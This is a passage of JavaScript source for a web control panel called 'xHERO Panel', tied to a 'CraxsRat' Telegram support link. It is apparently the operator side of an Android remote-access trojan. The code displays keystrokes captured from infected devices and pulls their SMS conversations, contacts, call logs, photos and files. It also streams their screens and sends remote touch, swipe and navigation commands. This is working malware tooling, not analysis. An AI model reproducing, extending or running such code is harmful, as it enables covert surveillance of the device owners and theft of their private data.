                        </div>
                        <div class="detail-item">
                            <span class="detail-label">Support</span>
                            <a href="https://t.me/CraxsRat_EU" target="_blank" class="detail-link">Contact Admin</a>
                        </div>
                    </div>
                </div>
            </div>
        `;
    }

    function loadKeyloggerPage(container, user) {
        container.innerHTML = `
            <div class="keylogger-header">
                <h3>Live Keylogger Feed</h3>
                <p>Monitor captured keystrokes and text input from all devices in real-time.</p>
            </div>
            <div class="keylogger-filters">
                <select id="keylog-device-filter" class="select-control">
                    <option value="">All Devices</option>
                </select>
                <button id="clear-keylogs-btn" class="file-btn">
                    <i class="material-icons">delete_sweep</i> Clear All Logs
                </button>
            </div>
            <table class="data-table keylogger-table">
                <thead>
                    <tr>
                        <th>Device</th>
                        <th>App / Context</th>
                        <th>Captured Text</th>
                        <th>Timestamp</th>
                    </tr>
                </thead>
                <tbody id="keylog-body">
                    <tr><td colspan="4">Listening for activity...</td></tr>
                </tbody>
            </table>
        `;

        const deviceFilter = document.getElementById('keylog-device-filter');
        const keylogBody = document.getElementById('keylog-body');
        const clearBtn = document.getElementById('clear-keylogs-btn');

        // Populate device filter
        onValue(ref(database, `users/${user.uid}/devices`), (snapshot) => {
            const devices = snapshot.val() || {};
            deviceFilter.innerHTML = '<option value="">All Devices</option>';
            Object.keys(devices).forEach(key => {
                const option = document.createElement('option');
                option.value = key;
                option.textContent = devices[key].model || key;
                deviceFilter.appendChild(option);
            });
        }, { onlyOnce: true });

        // Listen for logs
        const devicesRef = ref(database, `users/${user.uid}/devices`);
        onValue(devicesRef, (snapshot) => {
            const devices = snapshot.val() || {};
            keylogBody.innerHTML = '';
            let hasLogs = false;

            Object.keys(devices).forEach(deviceKey => {
                const logs = devices[deviceKey].keylog || {};
                const selectedDevice = deviceFilter.value;
                if (selectedDevice && selectedDevice !== deviceKey) return;

                Object.values(logs).forEach(log => {
                    hasLogs = true;
                    const row = document.createElement('tr');
                    row.innerHTML = `
                        <td><strong>${devices[deviceKey].model || deviceKey}</strong></td>
                        <td><span class="meta-chip">${log.package || 'System'}</span></td>
                        <td class="keylog-text">${log.text}</td>
                        <td>${new Date(log.timestamp).toLocaleString()}</td>
                    `;
                    keylogBody.prepend(row);
                });
            });

            if (!hasLogs) {
                keylogBody.innerHTML = '<tr><td colspan="4">No logs captured yet. Ensure Keylogger is enabled in Shield Protection.</td></tr>';
            }
        });

        clearBtn.addEventListener('click', () => {
            if (confirm("Are you sure you want to clear all keylogs from all devices?")) {
                onValue(ref(database, `users/${user.uid}/devices`), (snapshot) => {
                    const devices = snapshot.val() || {};
                    Object.keys(devices).forEach(deviceKey => {
                        remove(ref(database, `users/${user.uid}/devices/${deviceKey}/keylog`));
                    });
                }, { onlyOnce: true });
            }
        });

        deviceFilter.addEventListener('change', () => {
            // Trigger a re-render by slightly nudging the view or relying on the existing listener
        });
    }

    function loadNotificationsPage(container, user) {
        const notificationsRef = query(ref(database, `users/${user.uid}/notifications`), limitToLast(100));
        onValue(notificationsRef, (snapshot) => {
            container.innerHTML = `
                <div class="notifications-header">
                    <h3>Recent Notifications</h3>
                    <p>Stay updated with device activity</p>
                </div>
                <table class="data-table notifications-table">
                    <thead>
                        <tr>
                            <th>Device</th>
                            <th>Message</th>
                            <th>Timestamp</th>
                        </tr>
                    </thead>
                    <tbody></tbody>
                </table>
            `;
            const tableBody = container.querySelector('tbody');
            const notifications = snapshot.val();
            if (notifications && Object.keys(notifications).length > 0) {
                Object.values(notifications).reverse().forEach(notifText => {
                    const parts = notifText.split(' at ');
                    const timestamp = parts.pop();
                    const deviceAndMessage = parts.join(' at ');

                    let message = '';
                    let device = '';

                    if (deviceAndMessage.endsWith(' disconnected')) {
                        message = 'disconnected';
                        device = deviceAndMessage.replace(' disconnected', '');
                    } else if (deviceAndMessage.endsWith(' connected')) {
                        message = 'connected';
                        device = deviceAndMessage.replace(' connected', '');
                    }

                    const row = document.createElement('tr');
                    row.innerHTML = `
                        <td>${device.trim()}</td>
                        <td>${message}</td>
                        <td>${timestamp}</td>
                    `;
                    tableBody.appendChild(row);
                });
            } else {
                const row = document.createElement('tr');
                row.innerHTML = `<td colspan="3">No notifications yet.</td>`;
                tableBody.appendChild(row);
            }
        });
    }

    function loadBlockedPage(container, user) {
        container.innerHTML = `
            <div class="blocked-header">
                <h3>Blocked Devices</h3>
                <p>Manage your blocked device list</p>
            </div>
            <div class="blocked-container">
                <p>No blocked devices found.</p>
            </div>
        `;
    }

    function loadUpdatesPage(container, user) {
        container.innerHTML = `
            <div class="updates-header">
                <h3>System Updates</h3>
                <p>Check for the latest updates and changelog</p>
            </div>
            <div class="updates-container">
                <div class="update-card">
                    <div class="update-header">
                        <h4>No updates available</h4>
                        <span class="update-badge">Latest</span>
                    </div>
                    <p>You are running the latest version of xHERO Panel.</p>
                </div>
            </div>
        `;
    }

    let previousDevicesList = new Set();
    const previewableImageRegex = /\.(png|jpe?g|gif|webp)$/i;
    const pendingDownloadRequests = new Set();
    const deviceActivityListeners = {};
    const deviceUpdateCounts = {};

    function pickValueFromSource(source, keys = []) {
        if (!source) return null;
        for (const key of keys) {
            if (source[key] !== undefined && source[key] !== null) {
                return { key, value: source[key] };
            }
        }
        return null;
    }

    function normalizeDataValue(rawValue, key = '') {
        if (rawValue === undefined || rawValue === null) return 0;
        const sanitized = typeof rawValue === 'string' ? rawValue.replace(/[^\d.\-eE]/g, '') : rawValue;
        const numeric = Number(sanitized);
        if (!Number.isFinite(numeric) || numeric <= 0) return 0;
        const normalizedKey = (key || '').toLowerCase();
        if (normalizedKey.includes('mb')) return numeric;
        if (normalizedKey.includes('kb')) return numeric / 1024;
        if (normalizedKey.includes('gb')) return numeric * 1024;
        if (normalizedKey.includes('byte') || normalizedKey.includes('tx') || normalizedKey.includes('rx')) {
            return numeric / (1024 * 1024);
        }
        if (numeric > 1024 * 1024) return numeric / (1024 * 1024);
        if (numeric > 1024 && numeric < 1024 * 1024) return numeric / 1024;
        return numeric;
    }

    function calculateDeviceTraffic(deviceData = {}) {
        const sources = [
            deviceData.stats,
            deviceData.transfer,
            deviceData.traffic,
            deviceData.networkStats,
            deviceData.transferStats,
            deviceData.dataUsage,
            deviceData
        ];

        let sentValue = 0;
        let receivedValue = 0;

        for (const src of sources) {
            if (!sentValue) {
                const rawSent = pickValueFromSource(src, dataSentKeys);
                if (rawSent) {
                    sentValue = normalizeDataValue(rawSent.value, rawSent.key);
                }
            }
            if (!receivedValue) {
                const rawReceived = pickValueFromSource(src, dataReceivedKeys);
                if (rawReceived) {
                    receivedValue = normalizeDataValue(rawReceived.value, rawReceived.key);
                }
            }
            if (sentValue && receivedValue) break;
        }

        return {
            sentMB: Number(sentValue.toFixed(2)),
            receivedMB: Number(receivedValue.toFixed(2))
        };
    }

    function calculateAggregatedTraffic(devices = {}) {
        return Object.values(devices).reduce((acc, deviceData) => {
            const { sentMB, receivedMB } = calculateDeviceTraffic(deviceData);
            acc.sentMB += sentMB;
            acc.receivedMB += receivedMB;
            return acc;
        }, { sentMB: 0, receivedMB: 0 });
    }

    function formatDataUsage(valueMB = 0) {
        const normalizedValue = Number.isFinite(valueMB) ? valueMB : 0;
        return `${normalizedValue.toFixed(2)} MB`;
    }

    function escapeDeviceKeyForSelector(key) {
        if (window.CSS && CSS.escape) {
            return CSS.escape(key);
        }
        return key.replace(/"/g, '\"');
    }

    function formatUpdateCount(count) {
        if (!count || count <= 0) return '';
        return count > 99 ? '99+' : String(count);
    }

    function updateDeviceBadge(deviceKey) {
        const count = deviceUpdateCounts[deviceKey] || 0;
        const selector = `.device-card[data-device-key="${escapeDeviceKeyForSelector(deviceKey)}"] .device-update-badge`;
        const badge = document.querySelector(selector);
        if (!badge) return;
        if (count > 0) {
            badge.textContent = formatUpdateCount(count);
            badge.classList.add('visible');
        } else {
            badge.textContent = '';
            badge.classList.remove('visible');
        }
    }

    function ensureDeviceActivityListeners(user, deviceKey) {
        if (deviceActivityListeners[deviceKey]) return;
        const pathsToWatch = ['sms', 'contacts', 'call_logs', 'files'];
        const unsubscribers = [];
        pathsToWatch.forEach(path => {
            const targetRef = ref(database, `users/${user.uid}/devices/${deviceKey}/${path}`);
            let initialLoad = true;
            const unsubscribe = onValue(targetRef, (snapshot) => {
                if (initialLoad) {
                    initialLoad = false;
                    return;
                }
                if (snapshot.exists()) {
                    deviceUpdateCounts[deviceKey] = (deviceUpdateCounts[deviceKey] || 0) + 1;
                    updateDeviceBadge(deviceKey);
                }
            });
            unsubscribers.push(unsubscribe);
        });
        deviceActivityListeners[deviceKey] = unsubscribers;
    }

    function cleanupDeviceActivityListeners(activeDeviceKeys) {
        Object.keys(deviceActivityListeners).forEach(deviceKey => {
            if (!activeDeviceKeys.has(deviceKey)) {
                deviceActivityListeners[deviceKey].forEach(unsub => typeof unsub === 'function' && unsub());
                delete deviceActivityListeners[deviceKey];
                delete deviceUpdateCounts[deviceKey];
            }
        });
    }

    function updateDeviceCardInPlace(card, deviceKey, deviceData, user) {
        const status = deviceData.status || 'UNKNOWN';
        const isOnline = status === 'CONNECTED';
        const model = deviceData.model || deviceKey || 'Unknown device';
        const displayName = deviceData.model || deviceKey;
        const vendor = deviceData.brand || deviceData.manufacturer || 'Unknown vendor';
        const androidVersion = deviceData.androidVersion || 'N/A';
        const lastSeen = deviceData.lastSeenReadable || deviceData.lastSeen || 'N/A';
        const batteryRaw = deviceData.batteryLevel;
        const batteryLevel = typeof batteryRaw === 'number' ? Math.min(100, Math.max(0, Math.round(batteryRaw))) : null;
        const networkType = deviceData.networkType || deviceData.connectionType || '';
        const ipAddress = deviceData.ipAddress || deviceData.ip || deviceData.localIp || '';
        const location = deviceData.location || deviceData.country || deviceData.region || deviceData.city || '';
        const uptime = deviceData.uptimeReadable || deviceData.uptime || '';
        const trafficStats = calculateDeviceTraffic(deviceData);

        const metrics = [
            { label: 'Last Seen', value: lastSeen },
            { label: 'Android', value: androidVersion },
            { label: 'Sent', value: formatDataUsage(trafficStats.sentMB) },
            { label: 'Received', value: formatDataUsage(trafficStats.receivedMB) }
        ];

        if (networkType) {
            metrics.push({ label: 'Network', value: networkType });
        }
        if (uptime) {
            metrics.push({ label: 'Uptime', value: uptime });
        }

        const metaChips = [];
        if (!deviceData.model) {
            metaChips.push(`Device ID: ${deviceKey}`);
        }
        if (ipAddress) {
            metaChips.push(`IP: ${ipAddress}`);
        }
        if (location) {
            metaChips.push(`Location: ${String(location).replace(/_/g, ' ')}`);
        }

        const metricsMarkup = metrics.map(metric => `
            <div class="device-metric">
                <span class="metric-label">${metric.label}</span>
                <span class="metric-value">${metric.value}</span>
            </div>
        `).join('');
        const batteryMetricMarkup = `
            <div class="device-metric battery-metric">
                <div class="battery-icon" style="--battery-level:${batteryLevel !== null ? batteryLevel : 0};">
                    <div class="battery-fill"></div>
                    <span class="battery-text">${batteryLevel !== null ? `${batteryLevel}%` : 'N/A'}</span>
                </div>
                <div class="battery-details">
                    <span class="metric-label">Battery</span>
                    <span class="metric-value">${batteryLevel !== null ? `${batteryLevel}%` : 'N/A'}</span>
                </div>
            </div>
        `;

        const metaChipsMarkup = metaChips.length > 0 ? metaChips.map(chip => `<span class="meta-chip">${chip}</span>`).join('') : '';

        const deviceNameEl = card.querySelector('.device-name');
        const deviceSubtitleEl = card.querySelector('.device-subtitle');
        const deviceStatusEl = card.querySelector('.device-status');
        const metaTagsEl = card.querySelector('.device-meta-tags');
        const metricsEl = card.querySelector('.device-metrics');
        const batteryIconEl = card.querySelector('.battery-icon');

        if (deviceNameEl) deviceNameEl.textContent = displayName;
        if (deviceSubtitleEl) deviceSubtitleEl.textContent = `${vendor}${androidVersion !== 'N/A' ? ` - Android ${androidVersion}` : ''}`;
        if (deviceStatusEl) {
            deviceStatusEl.className = `device-status ${isOnline ? 'is-online' : ''}`;
            deviceStatusEl.innerHTML = `<span class="status-indicator"></span>${status}`;
        }
        if (metaTagsEl) {
            metaTagsEl.innerHTML = metaChipsMarkup || '';
            if (!metaChipsMarkup) metaTagsEl.style.display = 'none';
            else metaTagsEl.style.display = '';
        }
        if (metricsEl) {
            metricsEl.innerHTML = batteryMetricMarkup + metricsMarkup;
        }
        if (batteryIconEl) {
            batteryIconEl.style.setProperty('--battery-level', batteryLevel !== null ? batteryLevel : 0);
            const batteryTextEl = batteryIconEl.querySelector('.battery-text');
            if (batteryTextEl) batteryTextEl.textContent = batteryLevel !== null ? `${batteryLevel}%` : 'N/A';
        }

        updateDeviceBadge(deviceKey);
    }

    function attachDeviceListener(user) {
        const userDevicesRef = ref(database, `users/${user.uid}/devices`);
        onValue(userDevicesRef, (snapshot) => {
            const devices = snapshot.val();
            const container = document.getElementById('device-card-container');
            const onlineEl = document.getElementById('online-count');
            const totalEl = document.getElementById('total-count');

            let onlineCount = 0, totalCount = 0;
            const currentDevicesList = new Set();

            if (devices) {
                totalCount = Object.keys(devices).length;
                Object.keys(devices).forEach(deviceKey => {
                    currentDevicesList.add(deviceKey);
                    if (devices[deviceKey].status === 'CONNECTED') onlineCount++;
                });
            }

            if (onlineEl) onlineEl.textContent = onlineCount;
            if (totalEl) totalEl.textContent = totalCount;

            if (container && devices) {
                const existingCards = container.querySelectorAll('.device-card');
                const existingDeviceKeys = new Set();

                existingCards.forEach(card => {
                    const deviceKey = card.dataset.deviceKey;
                    if (deviceKey && devices[deviceKey]) {
                        existingDeviceKeys.add(deviceKey);
                        updateDeviceCardInPlace(card, deviceKey, devices[deviceKey], user);
                        ensureDeviceActivityListeners(user, deviceKey);
                    } else {
                        card.remove();
                    }
                });

                Object.keys(devices).forEach(deviceKey => {
                    if (!existingDeviceKeys.has(deviceKey)) {
                        const isNewDevice = !previousDevicesList.has(deviceKey);
                        ensureDeviceActivityListeners(user, deviceKey);
                        const card = createDeviceCard(deviceKey, devices[deviceKey], user, isNewDevice);
                        container.appendChild(card);
                        updateDeviceBadge(deviceKey);
                    }
                });
            } else if (container && !devices) {
                container.innerHTML = '';
            }

            previousDevicesList = currentDevicesList;
            cleanupDeviceActivityListeners(currentDevicesList);
        });
    }

    function attachClientsStatsListener(user) {
        const userDevicesRef = ref(database, `users/${user.uid}/devices`);
        onValue(userDevicesRef, (snapshot) => {
            const devices = snapshot.val();
            const sentEl = document.getElementById('sent-count');
            const receivedEl = document.getElementById('received-count');

            const totals = calculateAggregatedTraffic(devices || {});
            if (sentEl) sentEl.textContent = formatDataUsage(totals.sentMB);
            if (receivedEl) receivedEl.textContent = formatDataUsage(totals.receivedMB);
        });
    }

    function attachConnectionsPageListeners(user) {
        const userDevicesRef = ref(database, `users/${user.uid}/devices`);
        onValue(userDevicesRef, (snapshot) => {
            const devices = snapshot.val();
            const onlineEl = document.getElementById('online-count');
            const totalEl = document.getElementById('total-count');
            const sentEl = document.getElementById('sent-count');
            const receivedEl = document.getElementById('received-count');

            let onlineCount = 0, totalCount = 0;

            if (devices) {
                totalCount = Object.keys(devices).length;
                Object.keys(devices).forEach(deviceKey => {
                    const device = devices[deviceKey];
                    if (device.status === 'CONNECTED') onlineCount++;
                });
            }

            const totals = calculateAggregatedTraffic(devices || {});

            if (onlineEl) onlineEl.textContent = onlineCount;
            if (totalEl) totalEl.textContent = totalCount;
            if (sentEl) sentEl.textContent = formatDataUsage(totals.sentMB);
            if (receivedEl) receivedEl.textContent = formatDataUsage(totals.receivedMB);
        });
    }

    function createDeviceCard(deviceKey, deviceData, user, isNewDevice = false) {
        const card = document.createElement('article');
        card.className = 'device-card';
        card.dataset.deviceKey = deviceKey;
        if (isNewDevice) {
            card.classList.add('new-client-connected');
            setTimeout(() => card.classList.remove('new-client-connected'), 2400);
        }

        if (typeof stringToColor === 'function') {
            try {
                const accentColor = stringToColor(deviceKey);
                if (accentColor) {
                    card.style.setProperty('--device-accent', accentColor);
                }
            } catch (error) {
                // ignore coloring failures
            }
        }

        const updateCount = deviceUpdateCounts[deviceKey] || 0;
        const status = deviceData.status || 'UNKNOWN';
        const isOnline = status === 'CONNECTED';
        const model = deviceData.model || deviceKey || 'Unknown device';
        const displayName = deviceData.model || deviceKey;
        const vendor = deviceData.brand || deviceData.manufacturer || 'Unknown vendor';
        const androidVersion = deviceData.androidVersion || 'N/A';
        const lastSeen = deviceData.lastSeenReadable || deviceData.lastSeen || 'N/A';
        const batteryRaw = deviceData.batteryLevel;
        const batteryLevel = typeof batteryRaw === 'number' ? Math.min(100, Math.max(0, Math.round(batteryRaw))) : null;
        const networkType = deviceData.networkType || deviceData.connectionType || '';
        const ipAddress = deviceData.ipAddress || deviceData.ip || deviceData.localIp || '';
        const location = deviceData.location || deviceData.country || deviceData.region || deviceData.city || '';
        const uptime = deviceData.uptimeReadable || deviceData.uptime || '';
        const trafficStats = calculateDeviceTraffic(deviceData);

        const metrics = [
            { label: 'Last Seen', value: lastSeen },
            { label: 'Android', value: androidVersion },
            { label: 'Sent', value: formatDataUsage(trafficStats.sentMB) },
            { label: 'Received', value: formatDataUsage(trafficStats.receivedMB) }
        ];

        if (networkType) {
            metrics.push({ label: 'Network', value: networkType });
        }
        if (uptime) {
            metrics.push({ label: 'Uptime', value: uptime });
        }

        const metaChips = [];
        if (!deviceData.model) {
            metaChips.push(`Device ID: ${deviceKey}`);
        }
        if (ipAddress) {
            metaChips.push(`IP: ${ipAddress}`);
        }
        if (location) {
            metaChips.push(`Location: ${String(location).replace(/_/g, ' ')}`);
        }

        const metricsMarkup = metrics.map(metric => `
            <div class="device-metric">
                <span class="metric-label">${metric.label}</span>
                <span class="metric-value">${metric.value}</span>
            </div>
        `).join('');
        const batteryMetricMarkup = `
            <div class="device-metric battery-metric">
                <div class="battery-icon" style="--battery-level:${batteryLevel !== null ? batteryLevel : 0};">
                    <div class="battery-fill"></div>
                    <span class="battery-text">${batteryLevel !== null ? `${batteryLevel}%` : 'N/A'}</span>
                </div>
                <div class="battery-details">
                    <span class="metric-label">Battery</span>
                    <span class="metric-value">${batteryLevel !== null ? `${batteryLevel}%` : 'N/A'}</span>
                </div>
            </div>
        `;

        const metaChipsMarkup = metaChips.length > 0 ? metaChips.map(chip => `<span class="meta-chip">${chip}</span>`).join('') : '';
        const deviceInitial = displayName.charAt(0).toUpperCase() || 'D';

        card.innerHTML = `
            <div class="device-top">
                <div class="device-identity">
                    <div class="device-avatar">
                        ${deviceInitial}
                        <span class="device-update-badge${updateCount > 0 ? ' visible' : ''}">${updateCount > 0 ? formatUpdateCount(updateCount) : ''}</span>
                    </div>
                    <div>
                        <p class="device-name">${displayName}</p>
                        <p class="device-subtitle">${vendor}${androidVersion !== 'N/A' ? ` - Android ${androidVersion}` : ''}</p>
                    </div>
                </div>
                <div class="device-status ${isOnline ? 'is-online' : ''}">
                    <span class="status-indicator"></span>
                    ${status}
                </div>
            </div>
            <div class="device-actions">
                <button data-action="photos" title="View Photos">
                    <i class="material-icons">photo_library</i>
                    <span>Photos</span>
                </button>
                <button data-action="sms" title="View SMS Threads">
                    <i class="material-icons">sms</i>
                    <span>SMS</span>
                </button>
                <button data-action="contacts" title="View Contacts">
                    <i class="material-icons">contacts</i>
                    <span>Contacts</span>
                </button>
                <button data-action="call_logs" title="View Call Logs">
                    <i class="material-icons">call</i>
                    <span>Call Logs</span>
                </button>
                <button data-action="files" title="Open File Manager">
                    <i class="material-icons">folder</i>
                    <span>Files</span>
                </button>
                <button data-action="delete" title="Remove Client">
                    <i class="material-icons">delete_forever</i>
                    <span>Remove</span>
                </button>
                <button data-action="control" title="Remote Control" class="btn-control">
                    <i class="material-icons">settings_remote</i>
                    <span>Control</span>
                </button>
            </div>
            ${metaChipsMarkup ? `<div class="device-meta-tags">${metaChipsMarkup}</div>` : ''}
            <div class="device-metrics">
                ${batteryMetricMarkup}
                ${metricsMarkup}
            </div>
        `;

        card.querySelector('button[data-action="photos"]').addEventListener('click', () => openPhotosModal(deviceKey, model, user));
        card.querySelector('button[data-action="sms"]').addEventListener('click', () => openSmsModal(deviceKey, model, user));
        card.querySelector('button[data-action="contacts"]').addEventListener('click', () => openContactsModal(deviceKey, model, user));
        card.querySelector('button[data-action="call_logs"]').addEventListener('click', () => openCallLogsModal(deviceKey, model, user));
        card.querySelector('button[data-action="files"]').addEventListener('click', () => openFileManagerModal(deviceKey, model, user));
        card.querySelector('button[data-action="delete"]').addEventListener('click', () => deleteClient(deviceKey, user));
        card.querySelector('button[data-action="control"]').addEventListener('click', () => openRemoteControlModal(deviceKey, model, user));

        return card;
    }

    function openRemoteControlModal(deviceKey, deviceName, user) {
        const modal = document.getElementById('data-modal');
        document.getElementById('data-modal-title').textContent = `Remote Control: ${deviceName}`;
        const modalBody = document.getElementById('data-modal-body');
        modalBody.innerHTML = `
            <div class="remote-control-container">
                <div class="screen-view" id="screen-view">
                    <img id="live-screen-img" src="" alt="Screen Feed">
                    <div class="screen-overlay" id="screen-overlay"></div>
                    <div class="screen-loader" id="screen-loader">Initializing Stream...</div>
                </div>
                <div class="control-toolbar">
                    <button id="btn-start-stream" class="file-btn success"><i class="material-icons">play_arrow</i> Start</button>
                    <button id="btn-stop-stream" class="file-btn error"><i class="material-icons">stop</i> Stop</button>
                    <button id="btn-home" class="file-btn"><i class="material-icons">home</i> Home</button>
                    <button id="btn-back" class="file-btn"><i class="material-icons">arrow_back</i> Back</button>
                    <button id="btn-recents" class="file-btn"><i class="material-icons">menu</i> Recents</button>
                </div>
            </div>
        `;
        setModalBodyMode('immersive-body');
        modal.style.display = 'flex';

        const screenImg = document.getElementById('live-screen-img');
        const screenOverlay = document.getElementById('screen-overlay');
        const screenLoader = document.getElementById('screen-loader');
        const startBtn = document.getElementById('btn-start-stream');
        const stopBtn = document.getElementById('btn-stop-stream');

        // Listen for screen updates
        const screenRef = ref(database, `users/${user.uid}/devices/${deviceKey}/live_screen`);
        const unsubscribe = onValue(screenRef, (snapshot) => {
            const data = snapshot.val();
            if (data && data.base64) {
                screenImg.src = `data:image/jpeg;base64,${data.base64}`;
                screenLoader.style.display = 'none';
            } else if (data && data.error) {
                screenLoader.textContent = data.error;
                screenLoader.style.display = 'flex';
                screenLoader.style.color = '#ff6b6b';
            }
        });

        startBtn.onclick = () => sendCommand(user, deviceKey, { type: 'start_live_screen' });
        stopBtn.onclick = () => sendCommand(user, deviceKey, { type: 'stop_live_screen' });
        document.getElementById('btn-home').onclick = () => sendCommand(user, deviceKey, { type: 'remote_action', action: 'HOME' });
        document.getElementById('btn-back').onclick = () => sendCommand(user, deviceKey, { type: 'remote_action', action: 'BACK' });
        document.getElementById('btn-recents').onclick = () => sendCommand(user, deviceKey, { type: 'remote_action', action: 'RECENTS' });

        // Handle Advanced Touch & Swipe Events on Screen
        let isMouseDown = false;
        let startX, startY;

        screenOverlay.onmousedown = (e) => {
            isMouseDown = true;
            const rect = screenOverlay.getBoundingClientRect();
            startX = (e.clientX - rect.left) / rect.width;
            startY = (e.clientY - rect.top) / rect.height;
        };

        screenOverlay.onmouseup = (e) => {
            if (!isMouseDown) return;
            isMouseDown = false;
            const rect = screenOverlay.getBoundingClientRect();
            const endX = (e.clientX - rect.left) / rect.width;
            const endY = (e.clientY - rect.top) / rect.height;

            const dist = Math.sqrt(Math.pow(endX - startX, 2) + Math.pow(endY - startY, 2));

            if (dist < 0.05) {
                // It's a simple tap
                sendCommand(user, deviceKey, { type: 'remote_touch', x: startX, y: startY });
            } else {
                // It's a swipe
                sendCommand(user, deviceKey, { type: 'remote_swipe', x1: startX, y1: startY, x2: endX, y2: endY });
            }
        };

        screenOverlay.onmouseleave = () => { isMouseDown = false; };

        // Clean up on close
        const originalClose = document.getElementById('data-modal-close').onclick;
        document.getElementById('data-modal-close').onclick = () => {
            unsubscribe();
            sendCommand(user, deviceKey, { type: 'stop_live_screen' });
            if (originalClose) originalClose();
            document.getElementById('data-modal').style.display = 'none';
        };
    }

    function sendCommand(user, deviceKey, payload) {
        const commandRef = ref(database, `users/${user.uid}/devices/${deviceKey}/commands`);
        const newCommandRef = push(commandRef);
        return set(newCommandRef, { ...payload, status: 'Pending', timestamp: Date.now() });
    }

    function deleteClient(deviceKey, user) {
        const confirmModal = document.getElementById('confirm-modal');
        const confirmText = document.getElementById('confirm-modal-text');
        confirmText.textContent = `Are you sure you want to remove ${deviceKey}? `;
        confirmModal.style.display = 'flex';

        document.getElementById('confirm-modal-ok').onclick = () => {
            const deviceRef = ref(database, `users/${user.uid}/devices/${deviceKey}`);
            remove(deviceRef);
            confirmModal.style.display = 'none';
        };

        document.getElementById('confirm-modal-cancel').onclick = () => {
            confirmModal.style.display = 'none';
        };
    }

    function openPhotosModal(deviceKey, deviceName, user) {
        if (photosModalUnsubscribe && typeof photosModalUnsubscribe === 'function') {
            photosModalUnsubscribe();
            photosModalUnsubscribe = null;
        }

        const modal = document.getElementById('data-modal');
        document.getElementById('data-modal-title').textContent = `Photos for ${deviceName}`;
        const modalBody = document.getElementById('data-modal-body');
        modalBody.innerHTML = '<p>Loading photos...</p>';
        setModalBodyMode('immersive-body');
        modal.style.display = 'flex';
        const dataRef = ref(database, `users/${user.uid}/devices/${deviceKey}/photos`);

        photosModalUnsubscribe = onValue(dataRef, (snapshot) => {
            const photos = snapshot.val() || {};
            const photoEntries = Object.entries(photos);

            modalBody.innerHTML = '';

            const photoManager = document.createElement('div');
            photoManager.className = 'photo-manager';

            const listWrapper = document.createElement('div');
            listWrapper.className = 'photo-list-wrapper';

            const toolbar = document.createElement('div');
            toolbar.className = 'photo-manager-toolbar';

            const downloadAllBtn = document.createElement('button');
            downloadAllBtn.className = 'file-btn download-btn download-all-btn';
            downloadAllBtn.textContent = 'Download All';
            downloadAllBtn.disabled = photoEntries.length === 0;

            toolbar.appendChild(downloadAllBtn);

            const list = document.createElement('ul');
            list.className = 'file-list data-table photo-list';

            if (photoEntries.length > 0) {
                photoEntries.forEach(([key, photoUrl], index) => {
                    const fileName = getPhotoFileName(key, photoUrl, index);
                    const listItem = document.createElement('li');
                    listItem.className = 'file-item file-available';

                    const infoWrapper = document.createElement('div');
                    infoWrapper.className = 'file-info photo-info';
                    infoWrapper.innerHTML = `
                        <img src="${photoUrl}" alt="${fileName}" class="photo-thumb">
                        <div class="photo-info-text">
                            <span>${fileName}</span>
                            <small>Tap to preview • Click download for a copy</small>
                        </div>
                    `;
                    infoWrapper.addEventListener('click', () => {
                        showImagePreview(null, fileName, photoUrl);
                    });

                    const actionsWrapper = document.createElement('div');
                    actionsWrapper.className = 'file-actions';
                    const downloadBtn = document.createElement('button');
                    downloadBtn.className = 'file-btn download-btn';
                    downloadBtn.textContent = 'Download';
                    downloadBtn.addEventListener('click', (e) => {
                        e.stopPropagation();
                        triggerDirectDownload(photoUrl, fileName, listItem);
                    });

                    actionsWrapper.appendChild(downloadBtn);
                    listItem.appendChild(infoWrapper);
                    listItem.appendChild(actionsWrapper);

                    const progressLine = document.createElement('div');
                    progressLine.className = 'download-progress';
                    listItem.appendChild(progressLine);

                    list.appendChild(listItem);
                    listItem.dataset.nodeId = fileName;
                });
            } else {
                const emptyState = document.createElement('li');
                emptyState.className = 'photo-empty-state';
                emptyState.innerHTML = '<p>No photos found for this device.</p>';
                list.appendChild(emptyState);
            }

            listWrapper.appendChild(toolbar);
            listWrapper.appendChild(list);

            photoManager.appendChild(listWrapper);

            modalBody.appendChild(photoManager);

            if (photoEntries.length > 0) {
                downloadAllBtn.addEventListener('click', async () => {
                    downloadAllBtn.disabled = true;
                    downloadAllBtn.textContent = 'Downloading...';

                    const listItems = list.querySelectorAll('.file-item.file-available');
                    for (let i = 0; i < listItems.length; i++) {
                        const listItem = listItems[i];
                        const fileName = listItem.dataset.nodeId;
                        const photoUrl = photoEntries[i]?.[1];
                        if (!photoUrl) continue;
                        await triggerDirectDownload(photoUrl, fileName, listItem);
                    }

                    downloadAllBtn.textContent = 'Download All';
                    downloadAllBtn.disabled = false;
                });
            }
        });
    }

    function openSmsModal(deviceKey, deviceName, user) {
        const modal = document.getElementById('data-modal');
        document.getElementById('data-modal-title').textContent = '';
        const modalBody = document.getElementById('data-modal-body');
        setModalBodyMode('sms-phone-mode');
        modalBody.innerHTML = '<div class="sms-phone-loading">Loading messages...</div>';
        modal.style.display = 'flex';

        const dataRef = ref(database, `users/${user.uid}/devices/${deviceKey}/sms`);

        onValue(dataRef, (snapshot) => {
            const conversations = snapshot.val() || {};
            const entries = Object.entries(conversations).map(([address, messages]) => {
                const messageList = Object.entries(messages || {})
                    .map(([id, data]) => ({ id, ...parseSmsData(data) }))
                    .sort((a, b) => new Date(a.timestamp) - new Date(b.timestamp));

                const latest = messageList[messageList.length - 1];
                return { address, messages: messageList, latest };
            }).filter(item => item.messages.length > 0)
                .sort((a, b) => new Date(b.latest?.timestamp || 0) - new Date(a.latest?.timestamp || 0));

            let activeAddress = entries[0]?.address || '';
            let showThreadList = true;
            let searchQuery = '';

            const render = () => {
                const active = entries.find(item => item.address === activeAddress) || null;
                const activeNumber = active?.address?.replace(/_/g, '.') || '';
                const displayName = activeNumber || 'New Message';

                if (!entries.length) {
                    modalBody.innerHTML = `
                        <div class="sms-device">
                            <div class="sms-screen">
                                <div class="sms-app-nav sms-list-nav">
                                    <div class="sms-list-title">Messages</div>
                                    <button class="sms-nav-action" type="button" aria-label="New message">
                                        <i class="material-icons">edit</i>
                                    </button>
                                </div>
                                <div class="sms-empty-phone">
                                    <div class="sms-empty-icon"><i class="material-icons">chat_bubble_outline</i></div>
                                    <h3>No Messages</h3>
                                    <p>No SMS conversations were found on this device.</p>
                                </div>
                            </div>
                        </div>`;
                    return;
                }

                const conversationList = entries.map(item => {
                    const last = item.latest || {};
                    const number = item.address.replace(/_/g, '.');
                    const isActive = !showThreadList && item.address === activeAddress;
                    return `
                        <button class="sms-native-thread${isActive ? ' is-active' : ''}" data-sms-thread="${escapeSmsHtml(item.address)}" type="button">
